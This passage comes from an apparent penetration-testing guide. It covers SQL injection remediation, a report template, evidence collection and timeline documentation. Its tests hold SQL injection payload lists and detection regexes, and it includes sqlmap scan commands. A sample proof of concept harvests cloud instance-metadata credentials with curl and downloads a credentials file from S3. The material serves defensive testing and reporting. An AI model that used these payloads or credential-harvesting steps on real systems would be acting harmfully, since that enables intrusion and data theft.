    username = request.args.get('username', '')
    
    # ORM automatically uses parameterized queries
    users = User.query.filter(User.username == username).all()
    
    return jsonify({
        'results': [{'id': u.id, 'username': u.username, 'email': u.email} 
                    for u in users]
    })
````

### Verification Steps

```bash
# Test legitimate searches work
curl "https://api.example.com/api/search?username=testuser"

# Test SQL injection is blocked (should return error/empty)
curl "https://api.example.com/api/search?username=test' OR '1'='1"
curl "https://api.example.com/api/search?username=test' UNION SELECT 1,2,3,4-- -"

# Automated testing
cat > test_sqli_fix.py <<'PYTHON'
import requests

BASE_URL = "https://api.example.com"

injection_payloads = [
    "admin' OR '1'='1",
    "admin' UNION SELECT NULL-- -",
    "admin'; DROP TABLE users-- -",
    "admin' AND 1=1-- -",
    "admin' UNION SELECT @@version-- -",
]

def test_sqli_fixed():
    for payload in injection_payloads:
        response = requests.get(f"{BASE_URL}/api/search", 
                                params={'username': payload})
        
        # Should return 400 (validation error) or empty results
        assert response.status_code in [400, 200], f"Unexpected status: {response.status_code}"
        
        if response.status_code == 200:
            data = response.json()
            # Should not return multiple users or error messages
            assert len(data.get('results', [])) <= 1, "Possible SQL injection"
            assert 'error' in data or len(data.get('results', [])) == 0, "Payload not blocked"
        
        print(f"[PASS] Blocked: {payload}")

if __name__ == '__main__':
    test_sqli_fixed()
    print("[+] All SQL injection tests passed")
PYTHON

python3 test_sqli_fix.py
```

## Long-Term Remediation (30-90 days)

### Architectural Changes

**1. Database Least Privilege**

```sql
-- Create restricted application user
CREATE USER 'app_user'@'%' IDENTIFIED BY '<strong_password>';

-- Grant only SELECT on specific columns
GRANT SELECT (id, username, email, created_at) ON app_db.users TO 'app_user'@'%';

-- No INSERT, UPDATE, DELETE on sensitive tables
-- No access to admin_users table
REVOKE ALL PRIVILEGES ON app_db.admin_users FROM 'app_user'@'%';

-- No INFORMATION_SCHEMA access
REVOKE SELECT ON information_schema.* FROM 'app_user'@'%';

-- Apply changes
FLUSH PRIVILEGES;

-- Verify permissions
SHOW GRANTS FOR 'app_user'@'%';
```

**2. Implement Read-Only Replicas**

```python
# Separate read/write database connections
from sqlalchemy import create_engine

# Write connection (restricted to specific operations)
write_engine = create_engine('mysql://write_user:pass@primary-db/app_db')

# Read-only connection for searches
read_engine = create_engine('mysql://read_user:pass@replica-db/app_db')

def search_user(username):
    # Use read-only replica
    with read_engine.connect() as conn:
        result = conn.execute(
            text("SELECT id, username, email FROM users WHERE username = :username"),
            {"username": username}
        )
        return result.fetchall()
```

**3. API Rate Limiting**

```python
from flask_limiter import Limiter
from flask_limiter.util import get_remote_address

limiter = Limiter(
    app,
    key_func=get_remote_address,
    default_limits=["200 per day", "50 per hour"]
)

@app.route('/api/search')
@limiter.limit("10 per minute")
@validate_input('username', r'^[a-zA-Z0-9_-]{1,50}$', 50)
def search_user():
    # ... implementation ...
    pass
```

**4. Database Firewall/Monitoring**

[Unverified] Specific implementation depends on database platform and available tools.

```bash
# AWS RDS: Enable Database Activity Streams
aws rds modify-db-instance \
  --db-instance-identifier production-db \
  --enable-cloudwatch-logs-exports '["error","general","slowquery"]'

# Azure: Enable Auditing
az sql server audit-policy update \
  --resource-group myResourceGroup \
  --server myserver \
  --state Enabled \
  --storage-account mystorage
```

### Process Improvements

**1. Secure Coding Standards**

```markdown
# SQL Injection Prevention Checklist

## REQUIRED for all database queries:
- [ ] Use parameterized queries/prepared statements
- [ ] OR use ORM (SQLAlchemy, Django ORM, etc.)
- [ ] Validate all user input with whitelist regex
- [ ] Implement strict input length limits
- [ ] Use database user with minimal privileges
- [ ] Log all database queries in development

## PROHIBITED:
- [ ] String concatenation for SQL queries
- [ ] Direct user input in WHERE clauses
- [ ] Dynamic table/column names from user input
- [ ] Stored procedures with dynamic SQL
- [ ] eval() or exec() with database results

## CODE REVIEW FOCUS:
- Search for: cursor.execute(f"
- Search for: cursor.execute("... " + variable
- Search for: query = f"SELECT
- Verify: All .execute() calls use tuple parameters
```

**2. Static Analysis Integration**

```yaml
# .github/workflows/security-scan.yml
name: Security Scanning

on: [push, pull_request]

jobs:
  bandit:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v2
      - name: Run Bandit (Python Security Linter)
        run: |
          pip install bandit
          bandit -r . -f json -o bandit-report.json
          # Fail on SQL injection patterns
          bandit -r . -ll -ii -s B608 || exit 1

  semgrep:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v2
      - name: Run Semgrep
        run: |
          pip install semgrep
          semgrep --config=p/sql-injection --error
```

**3. Dynamic Application Security Testing (DAST)**

```bash
# OWASP ZAP automated scan
docker run -t owasp/zap2docker-stable zap-baseline.py \
  -t https://api.example.com \
  -r zap-report.html

# SQLMap integration test (in staging only)
sqlmap -u "https://staging-api.example.com/api/search?username=test" \
  --batch --level=5 --risk=3 --dbms=mysql \
  --technique=BEUSTQ --threads=5
# Expected: No SQL injection found
```

## Prevention Measures

### Automated Detection

**1. Runtime Application Self-Protection (RASP)**

```python
# SQL injection detection middleware
import re

SQLI_PATTERNS = [
    r"(\%27)|(\')|(\-\-)|(\%23)|(#)",
    r"((\%3D)|(=))[^\n]*((\%27)|(\')|(\-\-)|(\%3B)|(;))",
    r"\w*((\%27)|(\'))((\%6F)|o|(\%4F))((\%72)|r|(\%52))",
    r"((\%27)|(\'))union",
    r"union.*select",
    r"select.*from.*information_schema",
]

def detect_sqli_attempt(value):
    """Detect SQL injection patterns"""
    for pattern in SQLI_PATTERNS:
        if re.search(pattern, str(value), re.IGNORECASE):
            return True
    return False

@app.before_request
def check_sqli():
    for key, value in request.args.items():
        if detect_sqli_attempt(value):
            app.logger.warning(f"SQL injection attempt: {key}={value}, IP={request.remote_addr}")
            return jsonify({'error': 'Invalid input detected'}), 400
```

**2. Database Query Monitoring**

```python
# Log and alert on suspicious queries
from sqlalchemy import event
from sqlalchemy.engine import Engine
import time

@event.listens_for(Engine, "before_cursor_execute")
def receive_before_cursor_execute(conn, cursor, statement, parameters, context, executemany):
    # Check for dangerous patterns
    dangerous_keywords = ['DROP', 'DELETE', 'TRUNCATE', 'ALTER', 'GRANT']
    
    for keyword in dangerous_keywords:
        if keyword in statement.upper():
            app.logger.critical(f"DANGEROUS QUERY DETECTED: {statement}")
            # Alert security team
            send_security_alert(f"Dangerous SQL detected: {statement}")
    
    # Log all queries with execution time
    conn.info.setdefault('query_start_time', []).append(time.time())
    
@event.listens_for(Engine, "after_cursor_execute")
def receive_after_cursor_execute(conn, cursor, statement, parameters, context, executemany):
    total = time.time() - conn.info['query_start_time'].pop(-1)
    if total > 1.0:  # Slow query threshold
        app.logger.warning(f"Slow query ({total:.2f}s): {statement}")
```

**3. Continuous Security Testing**

```bash
# Scheduled SQLMap scan (staging environment)
cat > sqli_scan.sh <<'BASH'
#!/bin/bash

STAGING_URL="https://staging-api.example.com"
REPORT_DIR="/var/log/security-scans"
DATE=$(date +%Y%m%d)

# Run SQLMap against all endpoints
sqlmap -u "${STAGING_URL}/api/search?username=test" \
  --batch --crawl=2 --random-agent \
  --level=3 --risk=2 \
  --output-dir="${REPORT_DIR}/sqlmap_${DATE}"

# Check results
if grep -q "injectable" "${REPORT_DIR}/sqlmap_${DATE}"/*.txt; then
    echo "SQL injection vulnerability found!" | mail -s "ALERT: SQLi Detected" security@example.com
    exit 1
fi

echo "No SQL injection vulnerabilities detected"
BASH

# Add to cron
echo "0 2 * * * /usr/local/bin/sqli_scan.sh" | crontab -
```

### Training & Awareness

**Developer Security Training Module: SQL Injection**

**Session 1: Understanding SQL Injection (1 hour)**

- How SQL injection works (demonstration)
- Impact examples from real breaches
- Common vulnerable code patterns
- Secure coding alternatives

**Session 2: Hands-on Secure Development (2 hours)**

- Writing parameterized queries
- Using ORMs correctly
- Input validation strategies
- Code review for SQL injection

**Session 3: Testing & Prevention (1 hour)**

- Using SQLMap for security testing
- Static analysis tools
- Continuous security integration
- Incident response procedures

**Quarterly Code Review Sessions**

- Review recent code changes for SQL injection risks
- Share lessons learned from security findings
- Update secure coding guidelines

## Verification & Testing

### Regression Tests

```python
# test_api_functionality.py
import pytest
import requests

BASE_URL = "https://api.example.com"

def test_legitimate_search():
    """Ensure normal searches still work"""
    response = requests.get(f"{BASE_URL}/api/search", 
                           params={'username': 'testuser'})
    assert response.status_code == 200
    data = response.json()
    assert 'results' in data

def test_special_characters_in_username():
    """Test handling of valid special characters"""
    valid_usernames = ['test-user', 'test_user', 'test123']
    for username in valid_usernames:
        response = requests.get(f"{BASE_URL}/api/search", 
                               params={'username': username})
        assert response.status_code == 200

def test_empty_results():
    """Test handling of no results"""
    response = requests.get(f"{BASE_URL}/api/search", 
                           params={'username': 'nonexistent_user_xyz'})
    assert response.status_code == 200
    data = response.json()
    assert data['results'] == []

def test_api_performance():
    """Ensure fix doesn't impact performance"""
    import time
    start = time.time()
    response = requests.get(f"{BASE_URL}/api/search", 
                           params={'username': 'testuser'})
    duration = time.time() - start
    assert duration < 0.5  # Should respond within 500ms
```

### Security Tests

```python
# test_sqli_prevention.py
import pytest
import requests

BASE_URL = "https://api.example.com"

SQL_INJECTION_PAYLOADS = [
    "admin' OR '1'='1",
    "admin' OR '1'='1'-- -",
    "admin' OR '1'='1'/*",
    "admin' UNION SELECT NULL,NULL,NULL-- -",
    "admin' UNION SELECT @@version,NULL,NULL-- -",
    "admin'; DROP TABLE users-- -",
    "admin' AND 1=1-- -",
    "admin' AND 1=2-- -",
    "1' ORDER BY 10-- -",
    "admin' UNION SELECT table_name FROM information_schema.tables-- -",
    "admin' AND SLEEP(5)-- -",
    "admin' WAITFOR DELAY '0:0:5'-- -",
]

@pytest.mark.parametrize("payload", SQL_INJECTION_PAYLOADS)
def test_sql_injection_blocked(payload):
    """Verify all SQL injection attempts are blocked"""
    response = requests.get(f"{BASE_URL}/api/search", 
                           params={'username': payload})
    
    # Should either reject input or return safe results
    if response.status_code == 200:
        data = response.json()
        # Should not return multiple users (no OR injection)
        assert len(data.get('results', [])) <= 1
        # Should not contain error messages revealing DB info
        assert 'mysql' not in str(data).lower()
        assert 'syntax error' not in str(data).lower()
    else:
        # Input validation rejection is also acceptable
        assert response.status_code == 400

def test_no_information_disclosure():
    """Ensure error messages don't leak database information"""
    payloads = ["admin'", "admin''", "admin\\"]
    
    for payload in payloads:
        response = requests.get(f"{BASE_URL}/api/search", 
                               params={'username': payload})
        
        body = response.text.lower()
        # Check for database-specific error messages
        forbidden_strings = [
            'mysql', 'postgres', 'sql server', 'oracle',
            'syntax error', 'table', 'column', 'database',
            'query', 'select', 'from', 'where'
        ]
        
        for forbidden in forbidden_strings:
            assert forbidden not in body, f"Information disclosure: {forbidden}"

def test_timing_attack_prevention():
    """Ensure consistent response times (blind SQL injection prevention)"""
    import time
    
    # Test benign query
    start = time.time()
    requests.get(f"{BASE_URL}/api/search", params={'username': 'test'})
    benign_time = time.time() - start
    
    # Test timing attack payload
    start = time.time()
    requests.get(f"{BASE_URL}/api/search", 
                params={'username': "test' AND SLEEP(5)-- -"})
    attack_time = time.time() - start
    
    # Response time should not differ significantly
    assert abs(attack_time - benign_time) < 1.0, "Possible timing attack vector"
```

## Rollback Plan

```bash
# If remediation causes production issues:

# 1. Revert to previous code version
git revert <commit-hash>
git push origin main

# 2. Redeploy previous version
./deploy.sh --version=previous --environment=production

# 3. Keep WAF rules active (provides some protection)
# Do NOT disable WAF during rollback

# 4. Re-enable general query log to monitor exploitation
mysql -u root -p -e "SET GLOBAL general_log = 'ON';"

# 5. Document rollback
cat >> rollback_log.txt <<LOG
Rollback at: $(date)
Reason: <describe production issue>
Next steps: <remediation plan revision>
LOG

# 6. Implement emergency mitigation
# Temporarily restrict endpoint to authenticated users only
# or rate limit aggressively until permanent fix deployed
```

## Success Metrics

```bash
# Track remediation effectiveness

# 1. Zero SQL injection findings in scans
sqlmap -u "https://api.example.com/api/search?username=test" --batch
# Expected: "all tested parameters do not appear to be injectable"

# 2. Code coverage for security tests
pytest --cov=app --cov-report=html tests/
# Target: >95% coverage including SQLi test cases

# 3. No SQL injection attempts succeeding
# Monitor logs for blocked attempts
grep "SQL injection attempt" /var/log/app/security.log | wc -l
# Should show attempts being blocked, not succeeding

# 4. Performance not degraded
# Average response time should remain <500ms
curl -w "@curl-format.txt" -o /dev/null -s "https://api.example.com/api/search?username=test"
```

## References

- OWASP SQL Injection Prevention Cheat Sheet: https://cheatsheetseries.owasp.org/cheatsheets/SQL_Injection_Prevention_Cheat_Sheet.html
- CWE-89: Improper Neutralization of Special Elements used in an SQL Command
- NIST SP 800-53: SI-10 Information Input Validation
- PCI DSS Requirement 6.5.1: Injection Flaws
- SQLAlchemy Documentation: https://docs.sqlalchemy.org/ EOF

```

---

**Related Critical Topics:** Web Application Firewall (WAF) configuration, database security hardening, secure SDLC integration, vulnerability disclosure processes, incident response procedures for active exploitation.
```

---

## Report Structure

### Executive Summary

**Purpose:** Provides non-technical stakeholders with high-level findings, business impact, and recommended actions. Written last but presented first.

**Components:**

- **Scope**: Brief description of assessment boundaries (target systems, timeframe, methodology)
- **Key Findings Summary**: 3-5 most critical vulnerabilities with business impact
- **Risk Rating Overview**: Aggregate statistics (e.g., "5 Critical, 12 High, 8 Medium, 3 Low")
- **Recommended Actions**: Prioritized remediation steps with estimated timelines
- **Overall Security Posture**: One-paragraph assessment

**Template Structure:**

```
EXECUTIVE SUMMARY

Assessment Period: [Dates]
Scope: [Cloud environment, accounts, services tested]

Critical Findings:
1. [Vulnerability name] - [Business impact in 1 sentence]
2. [...]

Risk Distribution:
- Critical: X findings
- High: X findings  
- Medium: X findings
- Low: X findings

Primary Recommendations:
1. [Action] - Priority: Critical - Timeline: Immediate
2. [...]

Overall Assessment:
[2-3 sentences on overall security posture and urgency]
```

### Technical Findings Section

**Per-Finding Structure:**

**1. Finding Title** Use clear, descriptive titles: "Overprivileged IAM Role Allows Full S3 Access" rather than "IAM Misconfiguration"

**2. Severity Rating** Use consistent criteria:

- **Critical**: Direct path to full account compromise or data exfiltration
- **High**: Privilege escalation or significant unauthorized access
- **Medium**: Security control bypass or information disclosure
- **Low**: Security best practice violation with limited exploitability

**3. Affected Resources**

```
Account ID: 123456789012
Resource Type: IAM Role
Resource Name/ARN: arn:aws:iam::123456789012:role/WebAppRole
Region: us-east-1 (if applicable)
Discovery Date: 2025-10-15 14:32 UTC
```

**4. Description** Explain what the vulnerability is in clear technical terms:

```
The IAM role "WebAppRole" attached to EC2 instances contains a policy 
granting wildcard permissions (s3:*) on all S3 buckets (Resource: "*"). 
This allows any process running on associated instances to read, write, 
or delete data in any S3 bucket within the account, including buckets 
containing sensitive customer data.
```

**5. Technical Details** Provide specific configuration data:

```json
Policy Name: S3FullAccess
Policy Document:
{
  "Version": "2012-10-17",
  "Statement": [
    {
      "Effect": "Allow",
      "Action": "s3:*",
      "Resource": "*"
    }
  ]
}

Attached To:
- Role: WebAppRole (arn:aws:iam::123456789012:role/WebAppRole)
- Instances: i-0abc123def456 (10.0.1.50), i-0def456abc789 (10.0.1.51)
```

**6. Proof of Concept** Document exact steps to reproduce:

```bash
# 1. Assumed role via compromised EC2 instance
curl http://169.254.169.254/latest/meta-data/iam/security-credentials/WebAppRole

# 2. Configured AWS CLI with extracted credentials
export AWS_ACCESS_KEY_ID=ASIA...
export AWS_SECRET_ACCESS_KEY=...
export AWS_SESSION_TOKEN=...

# 3. Listed all S3 buckets
aws s3 ls
Output:
2025-01-15 company-financial-data
2025-02-03 customer-pii-backup
2025-03-12 application-logs

# 4. Successfully accessed sensitive bucket
aws s3 ls s3://customer-pii-backup/
Output:
2025-10-01 customer_database_backup.sql
2025-10-10 user_credentials.csv

# 5. Downloaded sensitive file
aws s3 cp s3://customer-pii-backup/user_credentials.csv ./
Download successful: 2.4 MB
```

**7. Impact Analysis** Describe realistic attack scenarios:

```
An attacker with access to the web application EC2 instances could:
- Exfiltrate all customer PII from backup buckets (estimated 500,000 records)
- Delete critical financial data, causing business disruption
- Modify backup files to inject malicious content
- Access application secrets stored in S3 configuration buckets

Business Impact:
- Data breach notification requirements (GDPR, CCPA)
- Potential regulatory fines
- Reputation damage
- Service availability risk
```

**8. Remediation** Provide specific, actionable steps:

```
Immediate Actions (0-24 hours):
1. Create new policy with least-privilege permissions:

{
  "Version": "2012-10-17",
  "Statement": [
    {
      "Effect": "Allow",
      "Action": [
        "s3:GetObject",
        "s3:PutObject"
      ],
      "Resource": "arn:aws:s3:::webapp-assets-bucket/*"
    }
  ]
}

2. Attach new policy to WebAppRole:
aws iam put-role-policy --role-name WebAppRole \
  --policy-name WebAppS3Access --policy-document file://policy.json

3. Remove overprivileged policy:
aws iam delete-role-policy --role-name WebAppRole \
  --policy-name S3FullAccess

4. Test application functionality to verify no breakage

Long-term Actions (1-4 weeks):
- Implement S3 bucket policies with explicit deny for sensitive buckets
- Enable S3 Block Public Access
- Configure SCPs to prevent wildcard permission policies
- Review all IAM roles for similar over-privileged policies
```

**9. References**

```
- CWE-269: Improper Privilege Management
- AWS IAM Best Practices: https://docs.aws.amazon.com/IAM/latest/UserGuide/best-practices.html
- OWASP Cloud Security: Excessive Permissions
- Relevant CVE: N/A (misconfiguration)
```

### Methodology Section

**Document testing approach:**

```
ASSESSMENT METHODOLOGY

Reconnaissance:
- Account enumeration using authenticated AWS CLI
- Resource discovery across all enabled regions
- Service inventory and configuration extraction

Enumeration:
Tools: ScoutSuite 5.12.0, Prowler 3.8.2, custom scripts
- IAM policy analysis (all users, roles, groups)
- S3 bucket permission enumeration
- EC2 security group and NACL review
- Lambda function configuration review

Vulnerability Analysis:
- Policy misconfiguration identification
- Privilege escalation path mapping using PMapper
- IMDS v1 availability testing
- Public exposure verification

Exploitation:
- Demonstrated privilege escalation via PassRole
- Credential harvesting from IMDS
- Unauthorized data access validation
- Token reuse testing

Post-Exploitation:
- Persistence mechanism evaluation
- Lateral movement path documentation
- Data exfiltration proof-of-concept
```

### Appendices

**A. Scope Definition**

```
In-Scope:
- AWS Account: 123456789012 (Production)
- Regions: us-east-1, us-west-2, eu-west-1
- Services: IAM, EC2, S3, Lambda, RDS, VPC
- Testing Period: 2025-10-15 to 2025-10-20
- Credentials Provided: Limited IAM user (ReadOnlyAccess)

Out-of-Scope:
- AWS Account: 987654321098 (Development) - separate assessment
- Destructive testing (data deletion, resource termination)
- Social engineering of personnel
- Physical security testing
- Denial of service testing
```

**B. Tools Used**

```
- AWS CLI v2.13.25
- ScoutSuite v5.12.0
- Prowler v3.8.2
- PMapper v1.2.4
- Pacu v1.5.1
- Burp Suite Professional v2023.10
- Custom enumeration scripts (provided in separate archive)
```

**C. Affected Resource Inventory** Spreadsheet or table format:

```
| Resource Type | Resource ID/Name | Finding ID | Severity | Status |
|--------------|------------------|------------|----------|---------|
| IAM Role | WebAppRole | F-001 | Critical | Open |
| S3 Bucket | customer-pii-backup | F-002 | High | Open |
| EC2 Instance | i-0abc123def456 | F-003 | Medium | Open |
```

**D. Risk Scoring Methodology**

```
CVSS v3.1 Base Score Calculation

Exploitability Metrics:
- Attack Vector (AV): Network (N) / Adjacent (A) / Local (L) / Physical (P)
- Attack Complexity (AC): Low (L) / High (H)
- Privileges Required (PR): None (N) / Low (L) / High (H)
- User Interaction (UI): None (N) / Required (R)

Impact Metrics:
- Confidentiality (C): High (H) / Low (L) / None (N)
- Integrity (I): High (H) / Low (L) / None (N)
- Availability (A): High (H) / Low (L) / None (N)

Severity Mapping:
- 9.0-10.0: Critical
- 7.0-8.9: High
- 4.0-6.9: Medium
- 0.1-3.9: Low
```

## Evidence Collection

### Screenshot Guidelines

**Requirements for valid evidence:**

- Full screen capture showing context
- Timestamp visible (terminal prompt, browser, system clock)
- Command executed and complete output visible
- Unique identifiers present (resource ARNs, IDs, usernames)
- Sequential numbering for multi-step processes

**Command-line evidence:**

```bash
# Include full command with parameters
aws sts get-caller-identity

# Capture complete output
{
    "UserId": "AIDAEXAMPLEUSERID",
    "Account": "123456789012",
    "Arn": "arn:aws:iam::123456789012:user/pentester"
}

# Show timestamp in prompt
[2025-10-15 14:32:18] pentester@kali:~$ 
```

**Best practices:**

```bash
# Set prompt to include timestamp
export PS1='[\D{%Y-%m-%d %H:%M:%S}] \u@\h:\w\$ '

# Log all commands and output
script -f evidence-session-$(date +%Y%m%d-%H%M%S).log

# Take screenshot after each significant finding
scrot -d 2 finding-001-iam-policy-$(date +%Y%m%d-%H%M%S).png

# Or use automated screenshot tool
import pyautogui
pyautogui.screenshot(f'evidence-{timestamp}.png')
```

### Terminal Output Capture

**Using script command:**

```bash
# Start logging session
script -f -t 2>timing.log session.log

# Perform testing
aws iam list-users
aws s3 ls
# ... additional commands ...

# Stop logging
exit

# Replay session later
scriptreplay -t timing.log session.log
```

**Using asciinema:**

```bash
# Install
apt install asciinema

# Record session
asciinema rec evidence-iam-enum.cast

# Perform testing
aws iam get-account-authorization-details --output json > iam-details.json

# Stop recording (Ctrl+D)

# Play back
asciinema play evidence-iam-enum.cast

# Upload or convert to GIF
asciinema upload evidence-iam-enum.cast
```

### API Response Capture

**Save raw JSON responses:**

```bash
# IAM policy enumeration
aws iam list-policies --output json > evidence/policies-list.json

aws iam list-attached-user-policies --user-name admin \
  --output json > evidence/admin-policies.json

# S3 bucket policies
for bucket in $(aws s3 ls | awk '{print $3}'); do
  aws s3api get-bucket-policy --bucket $bucket \
    > evidence/bucket-policy-$bucket.json 2>&1
done

# Include timestamps in filenames
timestamp=$(date +%Y%m%d-%H%M%S)
aws sts get-caller-identity > evidence/identity-$timestamp.json
```

**Capture HTTP traffic:**

```bash
# Using mitmproxy
mitmproxy -w evidence/api-traffic.mitm

# In another terminal, configure proxy
export HTTP_PROXY=http://127.0.0.1:8080
export HTTPS_PROXY=http://127.0.0.1:8080
aws s3 ls

# Traffic saved to evidence/api-traffic.mitm

# Convert to HAR format for analysis
mitmdump -r evidence/api-traffic.mitm -w evidence/api-traffic.har
```

**Using Burp Suite:**

```bash
# Configure AWS CLI to use Burp proxy
export HTTP_PROXY=http://127.0.0.1:8080
export HTTPS_PROXY=http://127.0.0.1:8080

# Import AWS certificate to trust store for TLS interception
# Note: AWS SDK may use certificate pinning

# Alternative: Use Burp's invisible proxying mode
# Save requests/responses from Burp > Project > Save items
```

### Metadata and Configuration Capture

**AWS CloudTrail logs:**

```bash
# Retrieve recent CloudTrail events for your actions
aws cloudtrail lookup-events \
  --lookup-attributes AttributeKey=Username,AttributeValue=pentester \
  --max-items 100 \
  --output json > evidence/cloudtrail-events.json

# Extract specific event types
jq '.Events[] | select(.EventName=="AssumeRole")' evidence/cloudtrail-events.json
```

**Configuration snapshots:**

```bash
# EC2 instance details
aws ec2 describe-instances --instance-ids i-0abc123def456 \
  > evidence/instance-i-0abc123def456.json

# Security group rules
aws ec2 describe-security-groups --group-ids sg-0123456789 \
  > evidence/sg-0123456789.json

# IAM role details
aws iam get-role --role-name WebAppRole > evidence/role-WebAppRole.json
aws iam list-role-policies --role-name WebAppRole >> evidence/role-WebAppRole.json
aws iam list-attached-role-policies --role-name WebAppRole >> evidence/role-WebAppRole.json
```

### Evidence Organization

**Directory structure:**

```
evidence/
├── 001-reconnaissance/
│   ├── account-enumeration.log
│   ├── resource-discovery.json
│   └── screenshots/
│       ├── 001-initial-access.png
│       └── 002-service-list.png
├── 002-iam-analysis/
│   ├── policy-enumeration.log
│   ├── user-policies/
│   │   ├── admin-policies.json
│   │   └── developer-policies.json
│   ├── role-policies/
│   │   └── WebAppRole.json
│   └── screenshots/
│       ├── 003-overprivileged-role.png
│       └── 004-wildcard-permissions.png
├── 003-s3-enumeration/
│   ├── bucket-list.txt
│   ├── bucket-policies/
│   └── public-buckets.log
├── 004-exploitation/
│   ├── privilege-escalation.log
│   ├── credential-harvest.json
│   ├── token-reuse-test.log
│   └── screenshots/
│       ├── 005-assumerole-success.png
│       ├── 006-s3-data-access.png
│       └── 007-sensitive-data.png
├── 005-post-exploitation/
│   ├── persistence-test.log
│   └── lateral-movement.log
└── metadata/
    ├── tool-versions.txt
    ├── scope-definition.txt
    └── timeline.csv
```

### Chain of Custody

**Evidence metadata file:**

```yaml
# evidence/metadata/finding-001-metadata.yaml
finding_id: F-001
finding_title: Overprivileged IAM Role Allows Full S3 Access
evidence_collected_by: John Doe
evidence_collected_date: 2025-10-15T14:32:18Z
evidence_hash: sha256:a3c5f7...
tools_used:
  - aws-cli:2.13.25
  - scoutsuite:5.12.0
related_files:
  - 002-iam-analysis/role-policies/WebAppRole.json
  - 004-exploitation/privilege-escalation.log
  - 004-exploitation/screenshots/005-assumerole-success.png
verification:
  verified_by: Jane Smith
  verified_date: 2025-10-15T16:45:00Z
  verification_method: Independent reproduction
```

**Hash verification:**

```bash
# Create hash manifest
find evidence/ -type f -exec sha256sum {} \; > evidence-hashes.txt

# Sort for easier comparison
sort evidence-hashes.txt > evidence-hashes-sorted.txt

# Verify integrity later
sha256sum -c evidence-hashes-sorted.txt
```

### Automated Evidence Collection Script

```bash
#!/bin/bash
# evidence-collector.sh

EVIDENCE_DIR="evidence-$(date +%Y%m%d-%H%M%S)"
mkdir -p "$EVIDENCE_DIR"/{logs,json,screenshots}

echo "[+] Starting evidence collection: $(date)" | tee "$EVIDENCE_DIR/collection.log"

# Collect identity
echo "[*] Collecting identity information..."
aws sts get-caller-identity > "$EVIDENCE_DIR/json/identity.json"

# Collect IAM data
echo "[*] Collecting IAM policies..."
aws iam list-policies --scope Local > "$EVIDENCE_DIR/json/custom-policies.json"
aws iam list-users > "$EVIDENCE_DIR/json/users.json"
aws iam list-roles > "$EVIDENCE_DIR/json/roles.json"

# Collect resource configurations
echo "[*] Collecting EC2 configurations..."
aws ec2 describe-instances --output json > "$EVIDENCE_DIR/json/ec2-instances.json"
aws ec2 describe-security-groups --output json > "$EVIDENCE_DIR/json/security-groups.json"

# Collect S3 data
echo "[*] Collecting S3 bucket list..."
aws s3 ls > "$EVIDENCE_DIR/logs/s3-buckets.txt"

# Generate hashes
echo "[*] Generating evidence hashes..."
find "$EVIDENCE_DIR" -type f -exec sha256sum {} \; > "$EVIDENCE_DIR/evidence-hashes.txt"

echo "[+] Evidence collection complete: $(date)" | tee -a "$EVIDENCE_DIR/collection.log"
echo "[+] Evidence stored in: $EVIDENCE_DIR"
```

### Video Recording

**For complex exploitation chains:**

```bash
# Using ffmpeg for screen recording
ffmpeg -f x11grab -s 1920x1080 -i :0.0 \
  -c:v libx264 -preset ultrafast \
  evidence/exploitation-demo-$(date +%Y%m%d-%H%M%S).mp4

# Using SimpleScreenRecorder (GUI)
# Or recordmydesktop
recordmydesktop --output evidence/privilege-escalation.ogv

# Annotate video with timestamps
ffmpeg -i input.mp4 -vf "drawtext=text='%{pts\:hms}':x=10:y=10:fontsize=24:fontcolor=white" \
  output-timestamped.mp4
```

## Timeline Documentation

### Timeline Importance

Timelines establish:

- Sequence of discovery and exploitation
- Duration of access periods
- Correlation with system logs
- Regulatory compliance evidence
- Attack chain reconstruction

### Timeline Format

**Structured timeline template:**

```
| Timestamp (UTC) | Phase | Action | Tool/Method | Result | Evidence |
|-----------------|-------|--------|-------------|--------|----------|
| 2025-10-15 13:00:00 | Reconnaissance | Initial access granted | AWS Console | Success | screenshots/001.png |
| 2025-10-15 13:15:32 | Reconnaissance | Account enumeration | aws sts get-caller-identity | Account ID: 123456789012 | logs/identity.json |
| 2025-10-15 13:22:18 | Enumeration | IAM user listing | aws iam list-users | 47 users discovered | json/users.json |
| 2025-10-15 14:05:43 | Analysis | Policy analysis | ScoutSuite | 23 findings identified | scoutsuite-report.html |
| 2025-10-15 14:32:18 | Exploitation | AssumeRole to WebAppRole | aws sts assume-role | Success - elevated privileges | logs/assume-role.json |
| 2025-10-15 14:45:55 | Exploitation | S3 bucket enumeration | aws s3 ls | 15 buckets accessible | logs/s3-list.txt |
| 2025-10-15 15:12:07 | Post-Exploit | Sensitive data access | aws s3 cp | Downloaded customer-pii-backup | logs/data-download.log |
| 2025-10-15 15:30:00 | Cleanup | Session terminated | aws sts get-caller-identity | Access revoked | logs/final-check.log |
```

### Automated Timeline Generation

**Parse CloudTrail for your actions:**

```bash
#!/bin/bash
# generate-timeline.sh

aws cloudtrail lookup-events \
  --lookup-attributes AttributeKey=Username,AttributeValue=pentester \
  --max-items 1000 \
  --output json > cloudtrail-raw.json

# Extract timeline data
jq -r '.Events[] | [
  .EventTime,
  .EventName,
  .Username,
  .EventSource,
  (.CloudTrailEvent | fromjson | .requestParameters | tostring)
] | @csv' cloudtrail-raw.json > timeline-cloudtrail.csv

# Format as markdown table
echo "| Timestamp | Event | User | Service | Parameters |" > timeline.md
echo "|-----------|-------|------|---------|------------|" >> timeline.md
cat timeline-cloudtrail.csv | sed 's/,/ | /g' | sed 's/^/| /' | sed 's/$/ |/' >> timeline.md
```

**Merge with local logs:**

```python
#!/usr/bin/env python3
# merge-timeline.py

import json
import csv
from datetime import datetime
from pathlib import Path

def parse_logs(evidence_dir):
    timeline = []
    
    # Parse script logs
    for log_file in Path(evidence_dir).rglob('*.log'):
        with open(log_file, 'r') as f:
            for line in f:
                # Extract timestamp from prompt format: [2025-10-15 14:32:18]
                if line.startswith('['):
                    timestamp = line[1:20]
                    action = line[22:].strip()
                    timeline.append({
                        'timestamp': timestamp,
                        'action': action,
                        'source': str(log_file),
                        'type': 'local'
                    })
    
    # Parse CloudTrail events
    with open(f'{evidence_dir}/cloudtrail-raw.json', 'r') as f:
        ct_data = json.load(f)
        for event in ct_data.get('Events', []):
            timeline.append({
                'timestamp': event['EventTime'],
                'action': event['EventName'],
                'source': event['EventSource'],
                'type': 'cloudtrail',
                'user': event.get('Username', 'N/A')
            })
    
    # Sort by timestamp
    timeline.sort(key=lambda x: x['timestamp'])
    
    return timeline

def export_timeline(timeline, output_file):
    with open(output_file, 'w', newline='') as f:
